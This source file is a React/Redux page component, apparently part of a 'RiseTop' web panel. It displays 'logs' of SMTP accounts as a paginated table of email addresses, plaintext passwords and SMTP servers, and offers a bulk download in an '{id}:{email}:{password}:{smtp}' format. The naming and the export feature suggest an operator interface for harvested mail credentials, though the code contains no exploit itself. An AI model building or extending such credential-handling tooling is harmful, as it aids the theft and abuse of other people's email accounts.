import React, { useEffect, useState } from 'react';
import ReactPaginate from 'react-paginate';

import languagesTranslate from '../../common/languages'

import { connect } from 'react-redux';
import { getOwnAllSMTP, changeAllSMTPFilter } from '../../store/actions/logs.actions'
import { baseUrl } from '../../common/config';

export default connect((s) => ({
  user: s.user.state,
  allSMTP: s.logs.smtp,
}), {
  getOwnAllSMTP,
  changeAllSMTPFilter
})(
  ({
    CurrentLanguage_G,

    user,
    allSMTP,

    getOwnAllSMTP,
    changeAllSMTPFilter
  }) => {
    const [CurrentPage, changeCurrentPage] = useState(1)
    const [SMTP, changeSMTP] = useState([])
    const [Pattern, changePattern] = useState('{id}:{email}:{password}:{smtp}')

    const handlePageChange = (page) => {

      changeCurrentPage(page);

      if (allSMTP.state.length != allSMTP.all && CurrentPage == (SMTP.length / allSMTP.filter.ShowOnPage) - 1)
        getOwnAllSMTP({
          token: user.token,
          from: allSMTP.state.length
        })

    }

    useEffect(() => {
      let _allSMTP = [];

      for (let i = 0; i < allSMTP.state.length; i++)
        _allSMTP = [..._allSMTP, ...allSMTP.state[i].smtp.map(v => ({ id: allSMTP.state[i].id, value: v }))]

      changeSMTP(_allSMTP)

    }, [allSMTP.state])

    return (
      <section className="content">
        <div className="body_scroll">
          <div className="block-header">
            <div className="row">
              <div className="col-lg-7 col-md-6 col-sm-12">
                <h2>{languagesTranslate[CurrentLanguage_G].allSMTPPage.header}</h2>
                <ul className="breadcrumb">
                  <li className="breadcrumb-item"><a href="index.html"><i className="zmdi zmdi-home"></i> RiseTop</a>
                  </li>
                  <li className="breadcrumb-item">{languagesTranslate[CurrentLanguage_G].allSMTPPage.pathItem1}</li>
                  <li className="breadcrumb-item active">{languagesTranslate[CurrentLanguage_G].allSMTPPage.pathItem2}</li>
                </ul>
                <button className="btn btn-primary btn-icon mobile_menu" type="button"><i
                  className="zmdi zmdi-sort-amount-desc"></i></button>
              </div>
            </div>
          </div>

          <div class="container-fluid">
            <div class="row clearfix">
              <div class="col-lg-12 col-md-12">
                <div class="card">
                  <div class="header">
                    <h2><strong>{languagesTranslate[CurrentLanguage_G].allSMTPPage.emails}</strong></h2>
                  </div>
                  <div class="body">
                    <div class="row mb-2">
                      <div class="col-lg-4 pr-1 pl-1 col-md-12">
                        <div className="d-flex w-100">
                          <div class="form-group w-100">
                            <input type="text" class="form-control" placeholder="{id}:{email}:{password}:{smtp}" value={Pattern} onChange={e => changePattern(e.target.value)} />
                          </div>
                          <a href={`${baseUrl}logs/download-smtp?_id=${user._id}&pattern=${Pattern}`} download className={'mb-3'}>
                            <button type="button" class="btn btn-primary mt-0 mb-0 h-100">
                              <span class="btn-label">
                                <i class="zmdi zmdi-download"></i>
                              </span>
                            </button>
                          </a>
                        </div>
                      </div>
                    </div>
                    <div className="row">
                      <div className="col-7">
                        <div className="w-100 h-100 d-flex align-items-center">
                          <span>{languagesTranslate[CurrentLanguage_G].allSMTPPage.showText}</span>
                          <div class="form-group d-inline-block mr-1 ml-1 mb-0">
                            <select class="custom-select" value={allSMTP.filter.ShowOnPage} onChange={e => changeAllSMTPFilter({ name: 'ShowOnPage', value: parseInt(e.target.value) })}>
                              <option value={'25'}>25</option>
                              <option value={'50'}>50</option>
                              <option value={'75'}>75</option>
                              <option value={'100'}>100</option>
                            </select>
                          </div>
                          <span>{languagesTranslate[CurrentLanguage_G].allSMTPPage.results}</span>
                          <span className={'ml-2 text-muted'}>{languagesTranslate[CurrentLanguage_G].allSMTPPage.show}Показано с {((CurrentPage - 1) * allSMTP.filter.ShowOnPage) + 1} по {CurrentPage * allSMTP.filter.ShowOnPage} из {SMTP.length} результатов</span>
                        </div>
                      </div>
                      <div className="col-5">
                        <ReactPaginate
                          previousLinkClassName={'btn btn-secondary previous'}
                          previousLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.previous}
                          nextLinkClassName={'btn btn-secondary next'}
                          nextLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.next}
                          breakLabel={'...'}
                          breakClassName={'break-me'}
                          pageCount={Math.ceil(allSMTP.all / allSMTP.filter.ShowOnPage)}
                          marginPagesDisplayed={2}
                          pageRangeDisplayed={5}
                          onPageChange={(page) => handlePageChange(page.selected + 1)}
                          containerClassName={'pagination justify-content-end'}
                          activeClassName={'active'}
                          pageLinkClassName={'num'}
                        />
                      </div>
                    </div>
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th>{languagesTranslate[CurrentLanguage_G].allSMTPPage.email}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allSMTPPage.password}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allSMTPPage.SMTP}</th>
                        </tr>
                      </thead>
                      <tbody>
                        {
                          SMTP.map((v, i) =>
                            i < CurrentPage * allSMTP.filter.ShowOnPage && i >= (CurrentPage - 1) * allSMTP.filter.ShowOnPage
                              ? <tr key={i}>
                                <td className={'text-center'}>
                                  {v.value.email}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.password}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.smtp}
                                </td >
                              </tr>
                              : null
                          )
                        }
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
      </section >
    )

  }
);